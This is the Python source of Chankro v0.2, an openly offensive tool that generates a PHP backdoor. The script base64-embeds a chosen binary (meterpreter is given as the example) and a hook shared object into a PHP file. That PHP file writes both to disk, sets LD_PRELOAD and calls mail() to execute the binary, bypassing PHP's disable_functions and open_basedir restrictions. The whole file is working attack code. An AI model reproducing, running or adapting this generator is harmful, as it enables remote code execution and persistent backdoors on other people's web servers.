######## Chankro v0.2 #######

# [+] Bypass disable_functions
# [+] Bypass open_basedir

##############################
#          @TheXC3LL         #
##############################


import argparse
import base64

parser = argparse.ArgumentParser(description='Generate PHP backdoor')
parser.add_argument('--arch', dest='arch',help='Architecture (32 or 64)')
parser.add_argument('--input', dest='meter', help='Binary to be executed (p.e. meterpreter)')
parser.add_argument('--output', dest='out', help='PHP filename')
parser.add_argument('--path', dest='pati', help='Absolute path')
args = parser.parse_args()




print "\n\n     -=[ Chankro ]=-\n    -={ @TheXC3LL }=-\n\n"


if not args.meter:
	print "[!] Error: please select a valid file as input"
 	exit()
try:
	with open(args.meter, "rb") as file:
		encoded_shell = base64.b64encode(file.read())
except:
	print "[!] Error: file could not be opened"
	exit()
if not args.out:
	print "[!] Error: please select a valid file as output"
	exit()
try:
	outfile = open(args.out, "w")
except:
	print "[!] Error: file could not be created"
	exit()

if not args.arch:
	print "[!] Error: select architecture (64 or 32)"
	exit()
else:
	if args.arch != "32" and args.arch != "64":
		print "[!] Error: unknow architecture"
		exit()
	else:
		archi = "hook" + args.arch + ".so"
if not args.pati:
	print "[!] Error: remote path"
	exit()

with open(archi, "rb") as bicho:
	encoded_bicho = base64.b64encode(bicho.read())


head = "<?php\n $hook = '" + encoded_bicho  + "';\n"
body1 = "$meterpreter = '" + encoded_shell + "';\n"
body2 = "file_put_contents('" + args.pati + "/chankro.so', base64_decode($hook));\n"
body3 = "file_put_contents('" + args.pati + "/acpid.socket', base64_decode($meterpreter));\n"
cosa3 = "putenv('CHANKRO=" + args.pati + "/acpid.socket');\n"
tail1 = "putenv('LD_PRELOAD=" + args.pati + "/chankro.so');\n"
tail2 = "mail('a','a','a','a');?>"

print "[+] Binary file: " + args.meter
print "[+] Architecture: x" + args.arch
print "[+] Final PHP: " + args.out + "\n\n"


outfile.write(head + body1 + body2 + body3 + cosa3 + tail1 + tail2)
outfile.close()
print "[+] File created!"
